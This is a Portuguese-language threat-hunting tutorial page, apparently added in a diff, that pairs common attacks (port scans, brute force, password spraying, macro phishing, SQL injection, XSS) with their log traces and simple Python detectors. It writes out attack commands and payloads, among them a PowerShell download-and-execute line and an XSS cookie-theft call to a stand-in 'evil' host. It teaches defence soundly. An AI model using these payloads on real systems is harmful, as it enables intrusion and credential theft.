+    <div class="pyr" data-l="6"><div class="lft"><span class="em">🚶</span><span class="nm">TTPs (comportamento)</span></div><span class="pain">DOLOROSO</span></div>
+    <div class="pyr" data-l="7"><div class="lft"><span class="em">🧠</span><span class="nm">Intenção / objetivo</span></div><span class="pain">CIRÚRGICO</span></div>
+  </div>
+
+  <div class="note warn"><span class="ni">▸</span><div><b>Erro clássico de SOC:</b> viver só na base da pirâmide (listas de IP/hash que envelhecem em horas). Isso dá sensação de produtividade e zero resiliência. Uma regra que detecta "<em>processo do Office gerando um shell</em>" pega <b>mil</b> variantes de malware diferentes, porque mira no comportamento, não na assinatura.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ LOG 101 ============ -->
+<section id="logs101" class="reveal">
+  <div class="eyebrow"><span class="num">04 /</span> ALFABETIZAÇÃO EM LOG</div>
+  <h2 class="sec">Anatomia de um log — dissecando linha por linha</h2>
+  <p class="sec-sub">Antes de caçar, você precisa <em>ler</em>. Todo log, não importa a fonte, responde às mesmas perguntas: quem, o quê, quando, onde, de onde, resultado. Aprenda a fatiar qualquer linha nesses pedaços.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Um log é uma <span class="em">frase de detetive</span>. Toda frase tem as mesmas partes: <em>QUEM</em> fez, <em>O QUÊ</em> fez, <em>QUANDO</em>, <em>ONDE</em>, e <em>se deu certo</em>. "A Maria (quem) abriu a porta da cozinha (o quê/onde) às 14h (quando) e conseguiu (resultado)."</p>
+    <p>Quando você aprende a achar essas 5 partes em qualquer linha bagunçada, você <span class="em">para de ter medo do log</span>. Ele vira só uma frase mal escrita esperando ser lida.</p>
+  </div>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">Exemplo 1 — Login com falha no Windows (Event ID 4625)</h3>
+  <div class="term">
+    <div class="term-bar"><i></i><i></i><i></i><span>Windows Security · EventID 4625</span></div>
+<pre><span class="c">An account failed to log on.</span>
+
+<span class="b">Account For Which Logon Failed:</span>
+    Security ID:        <span class="s">S-1-0-0</span>
+    Account Name:       <mark>administrador</mark>          <span class="c">← QUEM tentaram usar</span>
+    Account Domain:     CORP
+
+<span class="b">Failure Information:</span>
+    Failure Reason:     <span class="r">Unknown user name or bad password</span>  <span class="c">← RESULTADO</span>
+    Status:             <span class="a">0xC000006D</span>
+    Sub Status:         <span class="a">0xC000006A</span>      <span class="c">← senha errada (usuário existe)</span>
+
+<span class="b">Network Information:</span>
+    Workstation Name:   KALI-ATTACKER         <span class="c">← ONDE/de qual máquina</span>
+    Source Network Addr:<mark>45.61.x.x</mark>            <span class="c">← DE ONDE (IP externo!)</span>
+
+<span class="b">Logon Type:</span>            <span class="a">3</span>                     <span class="c">← rede (SMB/RDP remoto)</span>
+<span class="b">Process Time:</span>          2026-06-13 03:14:22   <span class="c">← QUANDO</span></pre>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Pedaço</th><th>O que olhar</th><th>Por que importa</th></tr>
+    <tr><td>Sub Status</td><td class="r"><code>0xC000006A</code> = senha errada · <code>0xC0000064</code> = usuário não existe</td><td>Diferencia "chutaram a senha de conta real" de "chutaram nome aleatório"</td></tr>
+    <tr><td>Logon Type</td><td><code>2</code> local · <code>3</code> rede · <code>10</code> RDP</td><td>Tipo 3/10 de IP externo às 3h = bandeira vermelha</td></tr>
+    <tr><td>Source Address</td><td>IP de origem</td><td>Externo? Geolocaliza para país improvável?</td></tr>
+    <tr><td>Account Name</td><td>Alvo da tentativa</td><td>Contas privilegiadas (admin) = prioridade máxima</td></tr>
+  </table>
+
+  <h3 style="font-size:16px;margin:26px 0 6px;color:var(--ink)">Exemplo 2 — A mesma história, em log de servidor web (Linux)</h3>
+  <div class="term">
+    <div class="term-bar"><i></i><i></i><i></i><span>nginx · access.log (Common Log Format)</span></div>
+<pre><mark>45.61.x.x</mark> - - [<span class="a">13/Jun/2026:03:14:09 +0000</span>] <span class="c">← DE ONDE · QUANDO</span>
+"<span class="k">POST</span> <span class="b">/wp-login.php</span> HTTP/1.1" <span class="r">401</span> 0 <span class="c">← O QUÊ · RESULTADO (401=negado)</span>
+"<span class="s">-</span>" "<span class="a">python-requests/2.31</span>"   <span class="c">← User-Agent: BOT, não navegador!</span></pre>
+  </div>
+  <div class="note tip"><span class="ni">▸</span><div><b>Leia o User-Agent sempre.</b> <code style="color:var(--amber)">python-requests</code>, <code style="color:var(--amber)">curl</code>, <code style="color:var(--amber)">Go-http-client</code>, <code style="color:var(--amber)">sqlmap</code> e <code style="color:var(--amber)">Hydra</code> gritam "ferramenta automatizada". Gente de verdade usa Chrome/Firefox/Safari. Um pico de requisições com UA de biblioteca HTTP = automação, quase nunca usuário legítimo.</div></div>
+
+  <h3 style="font-size:16px;margin:26px 0 6px;color:var(--ink)">As fontes de log que todo caçador precisa conhecer</h3>
+  <table class="tbl">
+    <tr><th>Fonte</th><th>O que ela vê</th><th>Você usa para</th></tr>
+    <tr><td>Windows Security (4624/4625/4688)</td><td>Logins, criação de processo</td><td>Brute force, execução, lateral</td></tr>
+    <tr><td><strong style="color:var(--sig)">Sysmon</strong></td><td>Tudo de processo, rede, registro, hash</td><td>O olho mais detalhado do host (essencial!)</td></tr>
+    <tr><td>PowerShell ScriptBlock (4104)</td><td>Comando real executado, mesmo ofuscado</td><td>Detectar scripts maliciosos</td></tr>
+    <tr><td>auditd / syslog (Linux)</td><td>Execuções, acessos, sudo</td><td>Privesc e persistência em Linux</td></tr>
+    <tr><td>Firewall / NetFlow / Zeek</td><td>Quem fala com quem na rede</td><td>C2, exfiltração, scan</td></tr>
+    <tr><td>Proxy / DNS</td><td>Domínios e URLs acessados</td><td>Beaconing, DGA, tunelamento</td></tr>
+    <tr><td>EDR</td><td>Correlação host + comportamento</td><td>Tudo, com contexto</td></tr>
+  </table>
+  <div class="note osint"><span class="ni">✶</span><div><b>Inovação:</b> some <b>logs de identidade em nuvem</b> (Entra ID / Okta / Google Workspace) à sua lista. Em 2026, a maioria dos ataques sérios não "invade um servidor" — eles <b>fazem login</b> com credencial roubada. O log de sign-in da nuvem virou tão importante quanto o 4625. Caça moderna olha "viagem impossível", consentimento OAuth suspeito e registro de novo MFA por um atacante.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ RECON ============ -->
+<section id="recon" class="reveal">
+  <div class="eyebrow"><span class="num">05 /</span> CATÁLOGO · FASE 1</div>
+  <h2 class="sec">Reconhecimento & Enumeração</h2>
+  <p class="sec-sub">Antes de bater na porta, o atacante mapeia a casa: quais portas estão abertas, quais serviços rodam, quem trabalha lá. É a fase mais barulhenta — e a mais ignorada pelos defensores. Pegar aqui = ganhar a guerra antes do primeiro tiro.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Antes de tentar entrar numa casa, o ladrão <span class="em">passa na frente várias vezes</span>: testa a maçaneta da porta, vê se a janela está aberta, conta quantas portas tem. Ele toca em <span class="em">tudo</span> rapidinho para ver o que cede.</p>
+    <p>No computador, isso é o <span class="em">"port scan"</span>: o atacante manda um "oi?" para a porta 22, 80, 443, 3389... uma por uma, super rápido. Se a casa tem uma câmera, ela vê <span class="em">uma mesma pessoa encostando em 1000 portas em 5 segundos</span>. Nenhum vizinho normal faz isso.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1046 · T1595</span><h3>Port Scan (Nmap)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev med">RECON</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>O atacante varre o host atrás de portas abertas e versões de serviço para achar o ponto fraco.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>terminal do atacante</span></div>
+<pre><span class="c"># scan agressivo: detecta versão + SO + scripts</span>
+<span class="k">nmap</span> -sS -sV -O -p- --script=vuln <span class="b">10.0.0.5</span>
+
+<span class="c"># mais furtivo: lento, fragmentado, sem ping</span>
+<span class="k">nmap</span> -sS -T2 -f -Pn -D <span class="a">RND:10</span> <span class="b">10.0.0.5</span></pre></div>
+      </div>
+      <div class="stage log"><div class="sh">O LOG QUE ISSO DEIXA</div>
+        <p>Conexões para muitas portas, da mesma origem, em janela curtíssima. Muitas resetadas (porta fechada).</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>firewall / zeek conn.log</span></div>
+<pre><span class="a">03:02:11</span> <mark>45.61.x.x</mark> → 10.0.0.5:<span class="n">22</span>  <span class="r">REJ</span>
+<span class="a">03:02:11</span> <mark>45.61.x.x</mark> → 10.0.0.5:<span class="n">23</span>  <span class="r">REJ</span>
+<span class="a">03:02:11</span> <mark>45.61.x.x</mark> → 10.0.0.5:<span class="n">80</span>  <span class="s">SF</span>
+<span class="a">03:02:11</span> <mark>45.61.x.x</mark> → 10.0.0.5:<span class="n">443</span> <span class="s">SF</span>
+<span class="a">03:02:12</span> <mark>45.61.x.x</mark> → 10.0.0.5:<span class="n">3306</span> <span class="r">REJ</span>
+<span class="c">  ... +940 portas em 4 segundos, mesma origem ...</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p><strong>O padrão não é o IP, é a forma.</strong> Um host legítimo fala com poucas portas, devagar. Scan = <em>1 origem × N destinos/portas × tempo mínimo × alta taxa de REJ</em>. O <code style="font-family:var(--mono);color:var(--sig)">SF</code> (handshake completo) marca portas abertas; <code style="font-family:var(--mono);color:var(--red)">REJ/RST</code> marca fechadas. A razão alta de rejeições é a impressão digital do scan.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Conte <strong>portas distintas por origem por minuto</strong>. Acima de um limiar (ex.: 15 portas em 60s) = scan. Em Python simples:</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>detect_portscan.py</span></div>
+<pre><span class="k">from</span> collections <span class="k">import</span> defaultdict
+
+<span class="c"># conta portas únicas tocadas por cada IP de origem</span>
+hits = defaultdict(set)
+<span class="k">for</span> linha <span class="k">in</span> open(<span class="s">"conn.log"</span>):
+    src, dst, porta = parse(linha)        <span class="c"># extrai campos</span>
+    hits[src].add(porta)
+
+<span class="k">for</span> ip, portas <span class="k">in</span> hits.items():
+    <span class="k">if</span> len(portas) > <span class="n">15</span>:                <span class="c"># limiar de scan</span>
+        print(<span class="r">f"[SCAN] {ip} tocou {len(portas)} portas"</span>)</pre></div>
+      </div>
+      <div class="stage rule"><div class="sh">SINAIS DE ALTA CONFIANÇA</div>
+        <p>Origem externa + portas sequenciais + UA/fingerprint de Nmap + horário fora do expediente. Some 2+ e a confiança vira quase certeza. <strong>Scan sozinho raramente vira incidente — mas scan seguido de tentativa de login na porta aberta é o início de uma cadeia. Correlacione.</strong></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="note osint"><span class="ni">✶</span><div><b>OSINT inovador — recon sem tocar no alvo:</b> atacantes espertos não escaneiam você diretamente; eles consultam <b>Shodan, Censys e FOFA</b>, que já varreram a internet inteira. Vira a mesa: <b>monitore sua própria superfície nesses mesmos serviços</b>. Se um banco de dados seu aparece exposto no Shodan, você descobre ao mesmo tempo que o atacante — e some o ativo antes do scan. Detecção pela ausência de scan: o melhor recon contra você é invisível no seu firewall justamente porque acontece na infra de terceiros.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ BRUTE FORCE ============ -->
+<section id="bruteforce" class="reveal">
+  <div class="eyebrow"><span class="num">06 /</span> CATÁLOGO · ACESSO INICIAL</div>
+  <h2 class="sec">Brute Force & Ataques a Credenciais</h2>
+  <p class="sec-sub">A forma mais antiga e ainda campeã de entrar: tentar senha até acertar. Tem três sabores, e cada um deixa um rastro <em>diferente</em>. Saber qual sabor você está vendo muda completamente a resposta.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Imagina um cadeado de 4 números. Tem três jeitos de abrir sem a chave:</p>
+    <p><span class="em">1. Força bruta clássica:</span> testar 0000, 0001, 0002... num cadeado só. <em>(barulhento — muitas tentativas no mesmo lugar)</em></p>
+    <p><span class="em">2. Password spraying:</span> você tem 100 cadeados e testa a senha "1234" em <em>todos</em>, uma vez em cada. <em>(esperto — poucas tentativas por cadeado, não tranca nenhum)</em></p>
+    <p><span class="em">3. Credential stuffing:</span> você roubou uma lista de "cadeado→senha" de outra casa e testa as mesmas combinações aqui, porque gente repete senha. <em>(quase silencioso — geralmente acerta de primeira)</em></p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1110.001</span><h3>Brute Force clássico</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Muitas senhas contra <strong>uma</strong> conta.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>atacante · hydra</span></div>
+<pre><span class="k">hydra</span> -l <span class="a">admin</span> -P rockyou.txt <span class="b">ssh://10.0.0.5</span></pre></div>
+      </div>
+      <div class="stage log"><div class="sh">O LOG</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>/var/log/auth.log</span></div>
+<pre><span class="a">03:14:01</span> sshd: <span class="r">Failed password</span> for <mark>admin</mark> from <mark>45.61.x.x</mark>
+<span class="a">03:14:01</span> sshd: <span class="r">Failed password</span> for <mark>admin</mark> from <mark>45.61.x.x</mark>
+<span class="a">03:14:02</span> sshd: <span class="r">Failed password</span> for <mark>admin</mark> from <mark>45.61.x.x</mark>
+<span class="c">  ... 800 falhas em 40s, MESMA conta, MESMA origem ...</span>
+<span class="a">03:14:43</span> sshd: <mark class="g">Accepted password</mark> for <mark>admin</mark>  <span class="r">← ACERTOU!</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Padrão: <em>1 conta × N senhas × 1 origem × alta taxa</em>. <strong>O evento que importa de verdade</strong> é o <code style="font-family:var(--mono)">Accepted</code> <em>logo após</em> uma rajada de <code style="font-family:var(--mono)">Failed</code>. Falhas sozinhas são ruído; falha→sucesso é comprometimento. Sempre olhe o que vem <em>depois</em> da rajada.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Limiar de falhas por conta+origem numa janela. E — crucial — alerta de <strong>sucesso precedido por ≥N falhas</strong>.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1110.003</span><h3>Password Spraying</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p><strong>Uma</strong> senha comum contra <strong>muitas</strong> contas. Evita travar contas (poucas tentativas por usuário) — por isso passa despercebido em quem só conta "falhas por conta".</p>
+      </div>
+      <div class="stage log"><div class="sh">O LOG</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Windows Security · 4625 (vários)</span></div>
+<pre><span class="a">03:01:02</span> 4625 user=<mark>joao.silva</mark>   senha errada
+<span class="a">03:01:03</span> 4625 user=<mark>maria.souza</mark>  senha errada
+<span class="a">03:01:04</span> 4625 user=<mark>pedro.lima</mark>   senha errada
+<span class="a">03:01:05</span> 4625 user=<mark>ana.costa</mark>    senha errada
+<span class="c">  ... 140 contas DIFERENTES, 1 tentativa cada, 1 origem ...</span>
+<span class="a">03:03:31</span> <mark class="g">4624</mark> user=<mark>carlos.dias</mark> <span class="r">← entrou (reusou "Verao@2026")</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Aqui o sinal <strong>inverte</strong>: não é "muitas falhas numa conta", é <em>"muitas contas com 1 falha cada, da mesma origem, na mesma janela"</em>. Quem conta falhas por usuário <strong>não vê isso</strong>. Você precisa contar <em>contas distintas falhando por origem</em>.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>detect_spray.py</span></div>
+<pre><span class="k">from</span> collections <span class="k">import</span> defaultdict
+
+<span class="c"># conta usuários DISTINTOS que falharam por IP de origem</span>
+alvos = defaultdict(set)
+<span class="k">for</span> ev <span class="k">in</span> eventos_4625(janela=<span class="s">"5min"</span>):
+    alvos[ev.src_ip].add(ev.usuario)
+
+<span class="k">for</span> ip, usuarios <span class="k">in</span> alvos.items():
+    <span class="k">if</span> len(usuarios) >= <span class="n">10</span>:        <span class="c"># 10+ contas de 1 origem</span>
+        print(<span class="r">f"[SPRAY] {ip} → {len(usuarios)} contas"</span>)</pre></div>
+      </div>
+      <div class="stage rule"><div class="sh">DETECÇÃO PELA AUSÊNCIA</div>
+        <p>Spray bem-feito é <em>lento</em> (1 tentativa por conta a cada hora) justamente para ficar abaixo do limiar. Defesa: olhe a <strong>distribuição</strong>, não o volume. Um IP que falha em 1 conta por hora, mas em <em>contas sempre diferentes</em> ao longo do dia, é spray devagar. E na nuvem: <strong>viagem impossível</strong> — login de carlos.dias do Brasil e 4 min depois da Rússia.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1110.004</span><h3>Credential Stuffing</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Pares usuário:senha vazados de <em>outro</em> serviço, testados aqui. Como a senha costuma estar certa, a taxa de <strong>sucesso é altíssima</strong> e há pouquíssima falha — o oposto de brute force.</p>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Pouquíssimas falhas, muitos sucessos, de muitos IPs (botnet), com UAs de biblioteca HTTP. O rastro não é a falha — é o <em>sucesso anômalo em massa</em>: muitas contas logando ao mesmo tempo de geolocalizações e dispositivos novos.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Picos de login bem-sucedido de <strong>dispositivos/locais nunca vistos</strong> para aquela conta; correlação com listas de vazamento (HIBP). Se você sabe que uma senha vazou, force reset <em>antes</em> de virar stuffing.</p>
+      </div>
+      <div class="stage rule"><div class="sh">OSINT</div>
+        <p><strong>Monitore vazamentos com o e-mail corporativo</strong> (Have I Been Pwned, monitores de dump). Saber que <code style="font-family:var(--mono)">@empresa.com</code> apareceu num combo list é detecção <em>preditiva</em> — você age antes do ataque.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">QUIZ</span> Você vê: 1 IP, 200 contas DIFERENTES, 1 falha cada, em 3 minutos. Que ataque é?</div>
+    <button class="opt" data-c="0">Brute force clássico <span class="res"></span></button>
+    <button class="opt" data-c="1">Password spraying <span class="res"></span></button>
+    <button class="opt" data-c="0">Credential stuffing <span class="res"></span></button>
+    <button class="opt" data-c="0">Port scan <span class="res"></span></button>
+    <div class="exp"><b>Spraying.</b> A chave é "muitas contas distintas × 1 tentativa cada × 1 origem". Brute force seria 1 conta × muitas senhas. Stuffing teria muitos <em>sucessos</em>. Se você só contasse falhas-por-conta, esse ataque seria invisível — por isso conte <em>contas-distintas-por-origem</em>.</div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ PHISHING ============ -->
+<section id="phishing" class="reveal">
+  <div class="eyebrow"><span class="num">07 /</span> CATÁLOGO · ACESSO INICIAL</div>
+  <h2 class="sec">Phishing & Engenharia Social</h2>
+  <p class="sec-sub">O caminho de entrada nº1 do mundo real. Não explora a máquina — explora a <em>pessoa</em>. Por isso a detecção mistura sinais técnicos (anexo, link, cabeçalho) com sinais comportamentais (o que o clique <em>causou</em> no host).</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Phishing é um <span class="em">bilhete falso</span>. Alguém te entrega um papel: <em>"Oi, sou da sua escola, me dá a senha do armário que eu guardo pra você."</em> Parece a escola, tem o logo da escola... mas é o ladrão imitando.</p>
+    <p>O truque é sempre o mesmo: <span class="em">pressa + medo + autoridade</span>. "Sua conta vai ser bloqueada em 1 hora! Clique já!" Quando alguém te apressa e te assusta ao mesmo tempo, <span class="em">desconfie</span> — é exatamente assim que o golpe funciona.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1566.001 · T1204</span><h3>Anexo malicioso → macro → shell</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>E-mail com Excel/Word. A vítima clica "Habilitar conteúdo". A macro roda PowerShell que baixa o malware. <strong>O ouro da detecção:</strong> o processo do Office <em>nunca</em> deveria ser pai de um shell.</p>
+      </div>
+      <div class="stage log"><div class="sh">O LOG (Sysmon Event 1 — criação de processo)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Sysmon · EventID 1</span></div>
+<pre><span class="b">ParentImage:</span>  C:\...\<mark>WINWORD.EXE</mark>          <span class="c">← o pai é o Word</span>
+<span class="b">Image:</span>        C:\...\<mark>powershell.exe</mark>      <span class="c">← o filho é um shell!</span>
+<span class="b">CommandLine:</span>  powershell -<span class="r">w hidden</span> -<span class="r">enc</span> <span class="a">SQBFAFgA...</span>
+<span class="b">User:</span>         CORP\joao.silva
+<span class="b">Hashes:</span>       SHA256=<span class="a">a3f5...</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Três bandeiras numa linha só: <strong>(1)</strong> pai = Office, filho = intérprete de script (relação proibida); <strong>(2)</strong> <code style="font-family:var(--mono);color:var(--red)">-w hidden</code> esconde a janela; <strong>(3)</strong> <code style="font-family:var(--mono);color:var(--red)">-enc</code> = comando em Base64 para fugir de detecção por texto. Cada uma sozinha é suspeita; as três juntas são quase um veredito.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>decodificando o -enc</span></div>
+<pre><span class="c"># Base64 → texto real (Python)</span>
+<span class="k">import</span> base64
+b64 = <span class="s">"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."</span>
+print(base64.b64decode(b64).decode(<span class="s">"utf-16-le"</span>))
+<span class="c"># → IEX (New-Object Net.WebClient).DownloadString('http://evil/x')</span>
+<span class="r">#   IEX = executar texto baixado da internet = clássico de malware</span></pre></div>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Regra de ouro: <strong>processo-filho de WINWORD/EXCEL/OUTLOOK que seja powershell/cmd/wscript/mshta/rundll32</strong>. Some <code style="font-family:var(--mono)">-enc</code>, <code style="font-family:var(--mono)">-w hidden</code>, <code style="font-family:var(--mono)">DownloadString</code>, <code style="font-family:var(--mono)">IEX</code> na linha de comando. Isso pega praticamente todo phishing com macro, independente do malware específico (mira no comportamento = topo da pirâmide).</p>
+      </div>
+      <div class="stage rule"><div class="sh">ATÉ ONDE A HISTÓRIA VAI</div>
+        <p>Depois do shell, espere: conexão de rede do powershell para domínio raro (Sysmon Event 3), arquivo novo escrito em <code style="font-family:var(--mono)">%TEMP%</code> ou <code style="font-family:var(--mono)">%APPDATA%</code> (Event 11), e uma chave de persistência (Event 13). <strong>Detectou o shell? Caia em cima e veja o que ele tocou nos 5 minutos seguintes.</strong></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="note osint"><span class="ni">✶</span><div><b>OSINT inovador para phishing:</b> domínios de phishing precisam de um <b>certificado TLS</b>, e cada certificado emitido é público nos <b>Certificate Transparency logs</b>. Monitore CT atrás de domínios parecidos com o seu (<code style="font-family:var(--mono)">empresa-login.com</code>, <code style="font-family:var(--mono)">empre5a.com</code>) <b>no momento em que são criados</b> — geralmente <em>antes</em> da campanha disparar. Ferramentas como dnstwist geram as variações; um monitor de CT avisa quando uma delas ganha certificado. Você bloqueia o domínio de phishing antes do primeiro e-mail chegar. <b>Isso é detecção que viaja para trás no tempo.</b></div></div>
+
+  <table class="tbl">
+    <tr><th>Sinal no e-mail</th><th>O que checar</th></tr>
+    <tr><td>SPF / DKIM / DMARC</td><td>Falharam? Remetente forjado é provável</td></tr>
+    <tr><td>Display vs. endereço real</td><td>"Banco X" mas <code>x9a@dominio-russo.ru</code></td></tr>
+    <tr><td>Domínio lookalike</td><td>Caracteres trocados / Unicode homográfico</td></tr>
+    <tr><td>Urgência + ameaça</td><td>"Conta bloqueada em 1h" = engenharia clássica</td></tr>
+    <tr><td>Link ≠ texto do link</td><td>Texto diz banco, href vai pra outro lugar</td></tr>
+    <tr><td>Anexo que pede macro</td><td>"Habilite conteúdo para ver" = quase sempre malicioso</td></tr>
+  </table>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ WEB ATTACKS ============ -->
+<section id="webattacks" class="reveal">
+  <div class="eyebrow"><span class="num">08 /</span> CATÁLOGO · APLICAÇÕES WEB</div>
+  <h2 class="sec">Ataques Web: SQLi, XSS, RCE & friends</h2>
+  <p class="sec-sub">Quando o alvo é uma aplicação, o atacante abusa de campos de entrada: o que era pra ser um nome vira um comando. Aqui o log mestre é o <em>access log</em> do servidor — e ele conta tudo, se você souber ler payloads.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Imagina um formulário que pergunta <em>"qual seu nome?"</em>. Você deveria escrever "João". Mas e se em vez do nome você escrever uma <span class="em">ordem secreta</span> que o computador obedece sem querer?</p>
+    <p><span class="em">SQL Injection:</span> em vez do nome, você escreve "me mostre TODAS as senhas". <span class="em">XSS:</span> você escreve um bilhetinho que rouba o cookie de quem ler. O computador é bobo: ele faz o que está escrito. <span class="em">A defesa é checar se o que a pessoa digitou é mesmo um nome — e não uma ordem disfarçada.</span></p>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1190</span><h3>SQL Injection</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Injetar SQL num campo para ler/alterar o banco. Sinais clássicos: aspas, <code style="font-family:var(--mono)">OR 1=1</code>, <code style="font-family:var(--mono)">UNION SELECT</code>, comentários <code style="font-family:var(--mono)">--</code>.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>payloads</span></div>
+<pre><span class="c"># bypass de login</span>
+usuario: <span class="r">admin' OR '1'='1' --</span>
+<span class="c"># extração via UNION</span>
+?id=<span class="r">1 UNION SELECT username,password FROM users--</span>
+<span class="c"># blind baseado em tempo</span>
+?id=<span class="r">1 AND SLEEP(5)--</span></pre></div>
+      </div>
+      <div class="stage log"><div class="sh">O LOG</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>nginx access.log (URL-encoded)</span></div>
+<pre><mark>203.0.x.x</mark> "GET /produto?id=<span class="r">1%27%20UNION%20SELECT</span>
+%20username,password%20FROM%20users<span class="r">--</span> HTTP/1.1" <span class="a">200</span>
+"<span class="a">sqlmap/1.8</span>"   <span class="c">← UA entrega a ferramenta!</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Primeiro <strong>decodifique a URL</strong> (<code style="font-family:var(--mono)">%27</code>=aspa, <code style="font-family:var(--mono)">%20</code>=espaço). Depois procure os tokens de SQL onde deveria ter só um número. <code style="font-family:var(--mono);color:var(--red)">UNION SELECT</code> num parâmetro <code style="font-family:var(--mono)">id</code> é injeção até prova em contrário. Status <code style="font-family:var(--mono)">200</code> após payload = pode ter funcionado; <code style="font-family:var(--mono)">500</code> = erro de SQL exposto (também revela vulnerabilidade).</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>detect_sqli.py</span></div>
+<pre><span class="k">import</span> urllib.parse, re
+
+PADROES = re.compile(
+    <span class="s">r"(union\s+select|or\s+1=1|sleep\(|--|%27|information_schema)"</span>,
+    re.I)
+
+<span class="k">for</span> linha <span class="k">in</span> open(<span class="s">"access.log"</span>):
+    url = urllib.parse.unquote(linha)     <span class="c"># decodifica %27 etc</span>
+    <span class="k">if</span> PADROES.search(url):
+        print(<span class="r">f"[SQLi?] {linha.strip()}"</span>)</pre></div>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>WAF + regex nos parâmetros + UA de ferramenta (<code style="font-family:var(--mono)">sqlmap</code>). Mas o sinal <em>mais</em> forte é volume: SQLi automatizado dispara <strong>centenas de variações do mesmo endpoint em segundos</strong>. Um humano testando manualmente é raro; uma enxurrada de payloads é a ferramenta trabalhando.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1059.007</span><h3>Cross-Site Scripting (XSS)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Injetar JavaScript que roda no navegador de <em>outra</em> vítima — rouba cookie/sessão, redireciona, keylog.</p>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>payloads</span></div>
+<pre><span class="r">&lt;script&gt;</span>fetch(<span class="s">'//evil/c?'</span>+document.cookie)<span class="r">&lt;/script&gt;</span>
+<span class="r">&lt;img src=x onerror=</span>alert(1)<span class="r">&gt;</span>
+<span class="r">&lt;svg/onload=</span>fetch(...)<span class="r">&gt;</span></pre></div>
+      </div>
